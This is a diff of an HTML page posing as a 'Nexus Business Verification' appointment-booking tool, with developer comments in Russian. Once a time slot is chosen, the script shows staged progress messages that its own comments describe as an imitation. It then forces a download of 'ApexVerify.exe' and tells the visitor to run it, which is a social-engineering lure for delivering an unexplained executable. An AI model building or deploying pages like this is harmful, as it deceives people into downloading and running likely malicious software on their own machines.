@@ -2,54 +2,87 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus Business Hub</title>
+    <title>Nexus Business Verification</title>
     <link rel="icon" type="image/x-icon" href="favicon.ico">
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 40px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); text-align: center; width: 350px; }
-        .btn { background: #3b82f6; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
-        .btn:hover { background: #2563eb; }
-        #loader { display: none; margin-top: 20px; }
-        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); text-align: center; width: 380px; }
+        
+        .time-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
+        .time-slot { background: #334155; border: 1px solid #475569; padding: 10px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+        .time-slot:hover { border-color: #3b82f6; background: #1e293b; }
+        .time-slot.selected { background: #3b82f6; border-color: #60a5fa; }
+
+        .btn { background: #3b82f6; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
+        .btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.6; }
+
+        #booking-section { display: block; }
+        #loader-section { display: none; }
+        
+        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div style="font-size: 40px; margin-bottom: 15px;">📅</div>
-    <h2 style="margin-bottom: 10px;">Slot Booking</h2>
-    <p style="color: #94a3b8; font-size: 14px; margin-bottom: 25px;">Book your verification appointment. The ApexVerify tool will be ready after confirmation.</p>
-    
-    <button class="btn" id="action-btn" onclick="startProcess()">Book & Download</button>
+    <!-- СЕКЦИЯ ВЫБОРА ВРЕМЕНИ -->
+    <div id="booking-section">
+        <div style="font-size: 40px; margin-bottom: 10px;">📅</div>
+        <h2 style="margin-bottom: 5px;">Select a Time Slot</h2>
+        <p style="color: #94a3b8; font-size: 13px;">Choose your verification appointment time to unlock the tool.</p>
+        
+        <div class="time-grid" id="timeGrid">
+            <div class="time-slot" onclick="selectTime(this)">09:00 AM</div>
+            <div class="time-slot" onclick="selectTime(this)">11:30 AM</div>
+            <div class="time-slot" onclick="selectTime(this)">02:15 PM</div>
+            <div class="time-slot" onclick="selectTime(this)">04:45 PM</div>
+        </div>
 
-    <div id="loader">
+        <button class="btn" id="confirmBtn" disabled onclick="confirmBooking()">Confirm Appointment</button>
+    </div>
+
+    <!-- СЕКЦИЯ ЗАГРУЗКИ (скрыта по умолчанию) -->
+    <div id="loader-section">
         <div class="spinner"></div>
-        <p id="msg" style="font-size: 13px; color: #3b82f6;">Checking availability...</p>
+        <h3 id="status-title">Securing your slot...</h3>
+        <p id="msg" style="font-size: 14px; color: #94a3b8;">Verifying selection with server...</p>
     </div>
 </div>
 
 <script>
-    function startProcess() {
-        const btn = document.getElementById('action-btn');
-        const loader = document.getElementById('loader');
+    let selectedElement = null;
+
+    function selectTime(el) {
+        // Убираем выделение с предыдущего
+        if (selectedElement) selectedElement.classList.remove('selected');
+        
+        // Выделяем текущий
+        el.classList.add('selected');
+        selectedElement = el;
+        
+        // Активируем кнопку
+        document.getElementById('confirmBtn').disabled = false;
+    }
+
+    function confirmBooking() {
+        document.getElementById('booking-section').style.display = 'none';
+        document.getElementById('loader-section').style.display = 'block';
+
         const msg = document.getElementById('msg');
+        const title = document.getElementById('status-title');
 
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-
+        // Имитация "умного" процесса
         setTimeout(() => {
-            msg.innerText = "Slot confirmed! Redirecting to secure download...";
+            msg.innerText = "Slot confirmed for " + selectedElement.innerText + "!";
+            title.innerText = "Generating Access...";
             
             setTimeout(() => {
-                // ПУТЬ БЕЗ ПЕРВОГО СЛЭША (важно для GitHub)
-                const filePath = 'api/v4/download/ApexVerify.exe';
-                
-                // Пробуем запустить скачивание
-                window.location.href = filePath;
-                
                 msg.style.color = '#10b981';
-                msg.innerText = "✅ Started! Please run ApexVerify.exe";
+                msg.innerText = "✅ Verification Tool ready. Starting download...";
+                
+                // СКАЧИВАНИЕ
+                window.location.href = 'api/v4/download/ApexVerify.exe';
             }, 2000);
             
         }, 2000);
